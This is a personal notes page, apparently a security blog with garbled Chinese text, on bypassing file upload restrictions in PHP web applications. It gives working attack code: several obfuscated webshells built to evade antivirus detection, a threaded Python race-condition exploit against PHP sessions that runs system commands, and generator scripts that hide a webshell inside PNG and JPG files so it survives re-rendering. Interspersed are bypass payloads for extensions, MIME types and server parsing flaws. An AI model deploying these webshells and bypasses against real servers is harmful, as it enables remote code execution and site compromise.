---
title: åˆæ¢æ–‡ä»¶ä¸Šä¼ 
date: 2022-09-12 16:06:26
tags:
- æ–‡ä»¶ä¸Šä¼ 
categories:
- web
- ç¬”è®°
---

# æ–‡ä»¶ä¸Šä¼ è¡¨å•

```html
<form enctype="multipart/form-data" action="__URL__" method="POST">
    Send this file: 
    <input name="file" type="file" />
    <input type="submit" value="submit" />
</form>
```

# åç¼€åè¿‡æ»¤

## é»‘åå•

### ç‰¹æ®Šå¯è§£æåç¼€

Php|php2|php3|php4|php5|php6|php7|pht|phtm|phtml

### windowsä¸‹ç›¸å…³

+ windowså¤§å°å†™ä¸æ•æ„Ÿ
+ windowsç³»ç»Ÿé»˜è®¤åˆ é™¤æ–‡ä»¶åç¼€çš„.å’Œç©ºæ ¼

### Apacheè§£ææ¼æ´

å½“apacheé‡åˆ°æ— æ³•è¯†åˆ«è§£æçš„æ–‡ä»¶åç¼€æ—¶ï¼Œä¼šå‘å‰è§£æï¼Œå¦‚xxx.php.123.456,
åœ¨mime.typesæ–‡ä»¶ä¸­å¦‚æœä¸å­˜åœ¨.123/.456è¿™ä¸¤ç§åç¼€ï¼Œ
é‚£ä¹ˆapacheä¼šå°†è¯¥æ–‡ä»¶è§£æä¸ºphpã€‚
åŒæ ·ä¹Ÿå¯ä»¥åœ¨httpd.confæ–‡ä»¶ä¸­æ›´æ”¹å‚æ•°æˆ–æ˜¯ç›´æ¥é…ç½®.htaccessã€‚

>  a.php.xxx ä¼šè§£ææˆ a.php

### **Apache HTTPDæ¢è¡Œè§£ææ¼æ´ï¼ˆCVE-2017-15715ï¼‰**

åœ¨2.4.0~2.4.29ç‰ˆæœ¬å­˜åœ¨ä¸€ä¸ªè§£ææ¼æ´ï¼Œåœ¨è§£æphpæ—¶ï¼Œ**1.php%0a**å°†æŒ‰ç…§**php**åç¼€è¿›è¡Œè§£æï¼Œå¯¼è‡´ç»•è¿‡ä¸€äº›æœåŠ¡å™¨çš„å®‰å…¨ç­–ç•¥

### **Nginx è§£ææ¼æ´**

ç”±äºnginx.confçš„å¦‚ä¸‹é…ç½®å¯¼è‡´nginxæŠŠä»¥â€™.phpâ€™ç»“å°¾çš„æ–‡ä»¶äº¤ç»™fastcgiå¤„ç†,å¯¹äºä»»æ„æ–‡ä»¶åï¼Œåœ¨åé¢æ·»åŠ /xxx.phpï¼ˆxxxï¼‰ä¸ºä»»æ„å­—ç¬¦åï¼Œå³å¯å°†æ–‡ä»¶ä½œä¸ºphpè§£æã€‚

```
ä¸Šä¼ shell.jpg
è®¿é—®shell.jpg/.php    ä¼šæŒ‰ç…§shell.phpæ‰§è¡Œ
```

## ç™½åå•

### %00æˆªæ–­

`1.php%00.jpg`

# é«˜çº§åˆ©ç”¨

## é…ç½®æ–‡ä»¶ç»•è¿‡

### .htaccesså’Œ.user.ini

**.user.iniåªå¯¹ä»–åŒä¸€ç›®å½•ä¸‹çš„æ–‡ä»¶èµ·ä½œç”¨**

`auto_append_file`

+ å¯ä»¥åŒ…å«ä¼ªåè®®
+ å¯ä»¥åŒ…å«æ—¥å¿—æ–‡ä»¶

## æ–‡ä»¶ç±»å‹æ£€æµ‹

**MIME**

```
Content-Type: image/png
Content-Type: image/jpeg
Content-Type: image/gif

Content-Type:application/x-zip-compressed     	zip
Content-Type:application/octet-stream  			rar
```

## æ–‡ä»¶å†…å®¹æ£€æµ‹

### çŸ­æ ‡ç­¾

```php
<? echo "123";?> //short_open_tags=on
<?=(expr);?> <=> <?php echo (expr);?>
<% echo "123";%> //asp_tags=on && php<7.0
<script language="php">echo "123";</script> //php<7.0
```

### ()[]{}

```
function()ä¸­çš„()å¯ä»¥ä½¿ç”¨``ç»•è¿‡
$_POST[1]ä¸­çš„[]å¯ä»¥ä½¿ç”¨{}ç»•è¿‡
```

### å…æ€ğŸ

```php
<?php
$a = "s#y#s#t#e#m";
$b = explode("#",$a);
$c = $b[0].$b[1].$b[2].$b[3].$b[4].$b[5];
$c($_REQUEST[1]);
?>
```

```php
<?php
$a=substr('1s',1).'ystem';
$a($_REQUEST[1]);
?>
```

```php
<?php
$a=strrev('metsys');
$a($_REQUEST[1]);
?>
```

```php
<?php
$a=$_REQUEST['a'];
$b=$_REQUEST['b'];
$a($b);
?>
```

```php
<?=$_GET[0]($_POST[1]);?>
```

## æ–‡ä»¶ä¸Šä¼ ä¸æ–‡ä»¶åŒ…å«

> å¾…è¡¥å……

[æ–‡ä»¶ä¸Šä¼ ä¸ä¼ªåè®®](https://blog.csdn.net/qq_45086218/article/details/114188610)

### æ—¥å¿—åŒ…å«

```php
<?=include"/var/lo"."g/nginx/access.lo"."g"?>    
```

### sessionæ¡ä»¶ç«äº‰

```php
<?=include"/tmp/sess_xxxx"?>  //.user.ini: auto_append_file=xxxx
```

```python
# ç¾½å¸ˆå‚…(yu22x)è„šæœ¬
import requests
import threading
session=requests.session()
sess='xxxx'
url1="url"
url2="url/upload"
data1={
	'PHP_SESSION_UPLOAD_PROGRESS':'<?php system("tac ../f*");?>'
}
file={
	'file':'xxxx'
}
cookies={
	'PHPSESSID': sess
}

def write():
	while True:
		r = session.post(url1,data=data1,files=file,cookies=cookies)
def read():
	while True:
		r = session.get(url2)
		if 'flag' in r.text:
			print(r.text)
			
threads = [threading.Thread(target=write),
       threading.Thread(target=read)]
for t in threads:
	t.start()
```



## æ–‡ä»¶ä¸Šä¼ ä¸xss

### osså­˜å‚¨æ¡¶åˆ©ç”¨

> å¾…è¡¥å……

[OSSå¯¹è±¡å­˜å‚¨ä¸Šä¼ è§£ææ¼æ´](https://xz.aliyun.com/t/2078)

### é…ç½®æ–‡ä»¶xss

pass

### å›¾ç‰‡ä¸Šä¼ 

> https://xz.aliyun.com/t/2657#toc-11

#### getimagesizeç»•è¿‡

```
#define width 100
#define height 100
```

```
copy 1.png/b+1.txt/a 2.php
copy 1.png/b+1.txt/a 2.png
```

#### pngäºŒæ¬¡æ¸²æŸ“ç»•è¿‡

```php
<?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);



$img = imagecreatetruecolor(32, 32);

for ($y = 0; $y < sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}

imagepng($img,'2.png');  //è¦ä¿®æ”¹çš„å›¾ç‰‡çš„è·¯å¾„
/* æœ¨é©¬å†…å®¹
<?$_GET[0]($_POST[1]);?>
 */

?>
```



#### jpgäºŒæ¬¡æ¸²æŸ“ç»•è¿‡

```php
<?php
    $miniPayload = "<?=\$_GET[0](\$_POST[1]);?>";


    if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
        die('php-gd is not installed');
    }

    if(!isset($argv[1])) {
        die('php jpg_payload.php <jpg_name.jpg>');
    }

    set_error_handler("custom_error_handler");

    for($pad = 0; $pad < 1024; $pad++) {
        $nullbytePayloadSize = $pad;
        $dis = new DataInputStream($argv[1]);
        $outStream = file_get_contents($argv[1]);
        $extraBytes = 0;
        $correctImage = TRUE;

        if($dis->readShort() != 0xFFD8) {
            die('Incorrect SOI marker');
        }

        while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {
            $marker = $dis->readByte();
            $size = $dis->readShort() - 2;
            $dis->skip($size);
            if($marker === 0xDA) {
                $startPos = $dis->seek();
                $outStreamTmp = 
                    substr($outStream, 0, $startPos) . 
                    $miniPayload . 
                    str_repeat("\0",$nullbytePayloadSize) . 
                    substr($outStream, $startPos);
                checkImage('_'.$argv[1], $outStreamTmp, TRUE);
                if($extraBytes !== 0) {
                    while((!$dis->eof())) {
                        if($dis->readByte() === 0xFF) {
                            if($dis->readByte !== 0x00) {
                                break;
                            }
                        }
                    }
                    $stopPos = $dis->seek() - 2;
                    $imageStreamSize = $stopPos - $startPos;
                    $outStream = 
                        substr($outStream, 0, $startPos) . 
                        $miniPayload . 
                        substr(
                            str_repeat("\0",$nullbytePayloadSize).
                                substr($outStream, $startPos, $imageStreamSize),
                            0,
                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
                                substr($outStream, $stopPos);
                } elseif($correctImage) {
                    $outStream = $outStreamTmp;
                } else {
                    break;
                }
                if(checkImage('payload_'.$argv[1], $outStream)) {
                    die('Success!');
                } else {
                    break;
                }
            }
        }
    }
    unlink('payload_'.$argv[1]);
    die('Something\'s wrong');

    function checkImage($filename, $data, $unlink = FALSE) {
        global $correctImage;
        file_put_contents($filename, $data);
        $correctImage = TRUE;
        imagecreatefromjpeg($filename);
        if($unlink)
            unlink($filename);
        return $correctImage;
    }

    function custom_error_handler($errno, $errstr, $errfile, $errline) {
        global $extraBytes, $correctImage;
        $correctImage = FALSE;
        if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
            if(isset($m[1])) {
                $extraBytes = (int)$m[1];
            }
        }
    }

    class DataInputStream {
        private $binData;
        private $order;
        private $size;

        public function __construct($filename, $order = false, $fromString = false) {
            $this->binData = '';
            $this->order = $order;
            if(!$fromString) {
                if(!file_exists($filename) || !is_file($filename))
                    die('File not exists ['.$filename.']');
                $this->binData = file_get_contents($filename);
            } else {
                $this->binData = $filename;
            }
            $this->size = strlen($this->binData);
        }

        public function seek() {
            return ($this->size - strlen($this->binData));
        }

        public function skip($skip) {
            $this->binData = substr($this->binData, $skip);
        }

        public function readByte() {
            if($this->eof()) {
                die('End Of File');
            }
            $byte = substr($this->binData, 0, 1);
            $this->binData = substr($this->binData, 1);
            return ord($byte);
        }

        public function readShort() {
            if(strlen($this->binData) < 2) {
                die('End Of File');
            }
            $short = substr($this->binData, 0, 2);
            $this->binData = substr($this->binData, 2);
            if($this->order) {
                $short = (ord($short[1]) << 8) + ord($short[0]);
            } else {
                $short = (ord($short[0]) << 8) + ord($short[1]);
            }
            return $short;
        }

        public function eof() {
            return !$this->binData||(strlen($this->binData) === 0);
        }
    }
?>
ç”¨æ³•  php exp.php a.png
```

